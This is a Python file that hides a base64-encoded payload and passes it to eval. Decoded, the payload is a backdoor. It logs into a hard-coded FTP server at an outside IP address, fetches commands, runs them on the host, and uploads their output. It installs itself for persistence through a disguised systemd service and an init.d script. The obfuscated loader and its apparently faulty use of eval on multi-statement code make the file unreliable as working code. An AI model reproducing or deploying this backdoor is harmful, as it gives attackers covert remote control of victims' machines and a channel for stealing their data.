import base64 
bb = b'ZnJvbSBmdHBsaWIgaW1wb3J0IEZUUAppbXBvcnQgaW8KaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCgpwcm94eV9pcCA9ICcxMTUuMjQ4LjUwLjkwJwpwcm94eV9wb3J0ID0gNTk5OQpwcm94eV91c2VyID0gJ2Fub255bW91cycKcHJveHlfcGFzcyA9ICdhbm9ueW1vdXMnCgpkZWxpbWl0ZXIgPSAnXG4tIyQjLVxuJwoKcGFyZW50X2RpciA9ICJtY2FmZWUiCgoKCmNsYXNzIGNtZEZpbGU6CiAgICBkZWYgX19pbml0X18oc2VsZiwgc2Vzc2lvbik6CiAgICAgICAgc2VsZi5wd2QgPSAnL3Jvb3QnCiAgICAgICAgc2VsZi5zZXNzaW9uID0gc2Vzc2lvbgogICAgICAgIHNlbGYub28gPSBiJycKICAgICAgICBzZWxmLnNzID0gJycKICAgICAgICBzZWxmLmNvbm5lY3RGdHAoKQogICAgICAgIHNlbGYuc2Vzc2lvbl9maWxlID0gb3BlbihzZWxmLnNlc3Npb24gKyAnY20nLCAndysnKSAgICAgIyBTYXZlIHRoZSBjb21tYW5kIGluIGxvY2FsIGxvZyBmaWxlCiAgICAgICAgc2VsZi5zZXNzaW9uX2ZpbGUuY2xvc2UoKQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgc2VsZi5mdHAubWtkKHBhcmVudF9kaXIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgic29tZSBlcnJvciAweDEiKQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNlbGYuZnRwLmN3ZChwYXJlbnRfZGlyKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoIlNvbWUgZXJyb3IgMHgzIikKICAgICAgICByZXR1cm4gCiAgICAKICAgIGRlZiBjb25uZWN0RnRwKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgc2VsZi5mdHAgPSBGVFAoKQogICAgICAgICAgICBzZWxmLmZ0cC5jb25uZWN0KHByb3h5X2lwLCBwcm94eV9wb3J0KQogICAgICAgICAgICBzZWxmLmZ0cC5sb2dpbihwcm94eV91c2VyLCBwcm94eV9wYXNzKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgc2VsZi5jb25uZWN0RnRwKCkKICAgICAgICByZXR1cm4gCgogICAgZGVmIHB1dENvbW1hbmQoc2VsZiwgY21kKToKICAgICAgICBzZWxmLnNlc3Npb25fZmlsZSA9IG9wZW4oc2VsZi5zZXNzaW9uICsgJy5jbScsICdhYicpICAgICAjIFNhdmUgdGhlIGNvbW1hbmQgaW4gbG9jYWwgbG9nIGZpbGUKICAgICAgICAjcyA9IHNlbGYuc2Vzc2lvbl9maWxlLnJlYWQoKQogICAgICAgIHNlbGYuc2Vzc2lvbl9maWxlLndyaXRlKGJ5dGVzKGRlbGltaXRlciArIGNtZCwgJ2FzY2lpJykpCiAgICAgICAgc2VsZi5zZXNzaW9uX2ZpbGUuY2xvc2UoKQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNlbGYuZ2V0Q29tbWFuZEZpbGUoKQogICAgICAgICAgICBpZiBsZW4oc2VsZi5zcykgPiAwOgogICAgICAgICAgICAgICAgcHJpbnQoIlxuV2FpdCwgbGFzdCBjb21tYW5kIGRpZCBub3QgZmluaXNoZWQiKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIAogICAgICAgICAgICBiaW8gPSBpby5CeXRlc0lPKGJ5dGVzKGNtZCwgJ2FzY2lpJykpCiAgICAgICAgICAgIHNlbGYuZnRwLnN0b3JiaW5hcnkoJ1NUT1IgJyArIHNlbGYuc2Vzc2lvbiArICcuY20nLCBiaW8pCiAgICAgICAgICAgIHByaW50KCJcbkNvbW1hbmQgRGVsaXZlcmVkISIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgic29tZSBlcnJvciAweDIiKQoKICAgICAgICByZXR1cm4gCgogICAgZGVmIGV4ZWN1dGVDb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuZ2V0Q29tbWFuZEZpbGUoKQogICAgICAgICNuZWVkIHRvIGNsZWFyIHRoZSBmaWxlIG5vdwogICAgICAgIHRyeToKICAgICAgICAgICAgYmlvID0gaW8uQnl0ZXNJTyhiJycpCiAgICAgICAgICAgIHNlbGYuZnRwLnN0b3JiaW5hcnkoJ1NUT1IgJyArIHNlbGYuc2Vzc2lvbiArICcuY20nLCBiaW8pCgogICAgICAgICAgICBvb3AgPSBzdWJwcm9jZXNzLmdldG91dHB1dChzZWxmLnNzKQogICAgICAgICAgICBwcmludChvb3ApCiAgICAgICAgICAgIHNlbGYuc3MgPSAnJwogICAgICAgICAgICAjc2VsZi5nZXRPdXRwdXRGaWxlKCkKICAgICAgICAgICAgc2VsZi5vbyArPSBieXRlcyhkZWxpbWl0ZXIgKyBvb3AsICdhc2NpaScpCiAgICAgICAgICAgIHByaW50KG9vcCkKCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgc2VsZi5vbyArPSBkZWxpbWl0ZXIgKyBvb3AKCiAgICAgICAgdHJ5OgogICAgICAgICAgICBiaW8gPSBpby5CeXRlc0lPKHNlbGYub28pICAgIyBTYXZlIHRoaXMgb3V0cHV0IGludG8gYSBjb21wbGV0ZSBvdXRwdXRzIGZpbGUKICAgICAgICAgICAgc2VsZi5mdHAuc3RvcmJpbmFyeSgnU1RPUiAnICsgc2VsZi5zZXNzaW9uICsgJy5vcCcsIGJpbykKCiAgICAgICAgICAgIGJpbyA9IGlvLkJ5dGVzSU8oYnl0ZXMob29wLCAnYXNjaWknKSkgICAjIFNhdmUgdGhpcyBvdXRwdXQgaW50byBhIGZpbGUKICAgICAgICAgICAgc2VsZi5mdHAuc3RvcmJpbmFyeSgnU1RPUiAnICsgc2VsZi5zZXNzaW9uICsgJy5vbycsIGJpbykKCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgic29tZSBlcnJvciAweDUiKQoKICAgICAgICByZXR1cm4gCgogICAgZGVmIGdldENvbW1hbmRGaWxlKHNlbGYpOgogICAgICAgIHNlbGYuc3MgPSAnJwogICAgICAgIHRyeToKICAgICAgICAgICAgc2VsZi50bXBmaWxlID0gb3BlbigndG1wJytzZWxmLnNlc3Npb24rJy5jbScsICd3YicpCiAgICAgICAgICAgIHNlbGYuZnRwLnJldHJiaW5hcnkoIlJFVFIgIiArIHNlbGYuc2Vzc2lvbiArICcuY20nLCBzZWxmLnRtcGZpbGUud3JpdGUpCiAgICAgICAgICAgIHNlbGYudG1wZmlsZS5jbG9zZSgpCiAgICAgICAgICAgIHNlbGYudG1wZmlsZSA9IG9wZW4oJ3RtcCcrc2VsZi5zZXNzaW9uKycuY20nLCAncmInKQogICAgICAgICAgICBzZWxmLnNzID0gc2VsZi50bXBmaWxlLnJlYWQoKQogICAgICAgICAgICBzZWxmLnRtcGZpbGUuY2xvc2UoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgYmlvID0gaW8uQnl0ZXNJTyhiJ3VuYW1lIC1hJykKICAgICAgICAgICAgc2VsZi5mdHAuc3RvcmJpbmFyeSgnU1RPUiAnICsgc2VsZi5zZXNzaW9uICsgJy5jbScsIGJpbykKICAgICAgICByZXR1cm4gc2VsZi5zcwoKICAgIGRlZiBnZXRMYXN0T3V0cHV0KHNlbGYpOgogICAgICAgIHJldHVybiAKCiAgICBkZWYgZ2V0T3V0cHV0RmlsZShzZWxmKToKICAgICAgICBzZWxmLm9vID0gYicnCiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLnRtcGZpbGUgPSBvcGVuKCd0bXAnK3NlbGYuc2Vzc2lvbisnLm9wJywgJ3diJykKICAgICAgICAgICAgc2VsZi5mdHAucmV0cmJpbmFyeSgiUkVUUiAiICsgc2VsZi5zZXNzaW9uICsgJy5vcCcsIHNlbGYudG1wZmlsZS53cml0ZSkKICAgICAgICAgICAgc2VsZi50bXBmaWxlLmNsb3NlKCkKICAgICAgICAgICAgc2VsZi50bXBmaWxlID0gb3BlbigndG1wJytzZWxmLnNlc3Npb24rJy5vcCcsICdyYicpCiAgICAgICAgICAgIHNlbGYub28gPSBzZWxmLnRtcGZpbGUucmVhZCgpCiAgICAgICAgICAgIHNlbGYudG1wZmlsZS5jbG9zZSgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBiaW8gPSBpby5CeXRlc0lPKGInJykKICAgICAgICAgICAgc2VsZi5mdHAuc3RvcmJpbmFyeSgnU1RPUiAnICsgc2VsZi5zZXNzaW9uICsgJy5vcCcsIGJpbykKICAgICAgICByZXR1cm4gc2VsZi5vbwogICAgZGVmIHNldFBlcnNpc3RhbmNlKHNlbGYsIHNjcmlwdG5hbWUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZiA9IG9wZW4oIi9saWIvc3lzdGVtZC9zeXN0ZW0vIitzY3JpcHRuYW1lKyIuc2VydmljZSIsICJ3YiIpCiAgICAgICAgICAgIHMgPSAiW1VuaXRdXG5EZXNjcmlwdGlvbj1Tb21ldGhpbmcgU3BlY2lhbCBBZ2FpblxuVHlwZT1pZGxlXG5cbltTZXJ2aWNlXVxuRXhlY1N0YXJ0PSIrc2VsZi5wd2QrIi8iK3NjcmlwdG5hbWUrIi5zaFxuXG5bSW5zdGFsbF1cbldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0IgogICAgICAgICAgICBmLndyaXRlKHMpCiAgICAgICAgICAgIGYuY2xvc2UoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoIiIpCiAgICAgICAgb3Muc3lzdGVtKCJjcCAiK3NlbGYucHdkKyIvIitzY3JpcHRuYW1lKyIuc2ggL2V0Yy9pbml0LmQvXG51cGRhdGUtcmMuZCAiK3NjcmlwdG5hbWUrIi5zaCBkZWZhdWx0c1xuc2VydmljZSAiK3NjcmlwdG5hbWUrIi5zaCBzdGFydCIpIAogICAgICAgIHJldHVybiAgCgogICAgZGVmIGxpbnV4X3B5dGhvbl9TY3JpcHRDcmVhdGUoc2VsZiwgcGF5bG9hZCwgc2NyaXB0bmFtZSk6CiAgICAgICAgZiA9IG9wZW4oc2VsZi5wd2QrIi8iK3NjcmlwdG5hbWUrIi5weSIsICJ3YiIpCiAgICAgICAgZi53cml0ZShwYXlsb2FkKQogICAgICAgIGYuY2xvc2UoKQogICAgICAgIG9zLnN5c3RlbSgiY2htb2QgK3ggIitzZWxmLnB3ZCsiLyIrc2NyaXB0bmFtZSsiLnB5IikKICAgICAgICBzID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWyd3aGljaCcsICdweXRob24nXSkKICAgICAgICBzID0gc1s6bGVuKHMpLTFdCiAgICAgICAgZiA9IG9wZW4oc2VsZi5wd2QrIi8iK3NjcmlwdG5hbWUrIi5zaCIsICJ3YiIpCiAgICAgICAgcyA9ICIjIS9iaW4vc2hcbm5vaHVwICIgKyBzdHIocykgKyAiICIgKyBzZWxmLnB3ZCsiLyIrc2NyaXB0bmFtZSsiLnB5ICZcbiIKICAgICAgICBmLndyaXRlKHMpCiAgICAgICAgZi5jbG9zZSgpCiAgICAgICAgb3Muc3lzdGVtKCJjaG1vZCAreCAiK3NlbGYucHdkKyIvIitzY3JpcHRuYW1lKyIuc2hcbnNoICIrc2VsZi5wd2QrIi8iK3NjcmlwdG5hbWUrIi5zaCIpCgpjID0gY21kRmlsZSgndHJpYWwnKQpjLmxpbnV4X3B5dGhvbl9TY3JpcHRDcmVhdGUob3BlbignY2xpZW50LnB5JywgJ3JiJykucmVhZCgpLCdzczEnKQpjLnNldFBlcnNpc3RhbmNlKCJzczEiKQp3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICAgIGMuZ2V0Q29tbWFuZEZpbGUoKQogICAgZXhjZXB0OgogICAgICAgIHByaW50KCJcbkVycm9yMSIpCiAgICB0cnk6CiAgICAgICAgYy5leGVjdXRlQ29tbWFuZCgpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoIlxuRXJyb3IyIik='
eval(base64.b64decode(bb))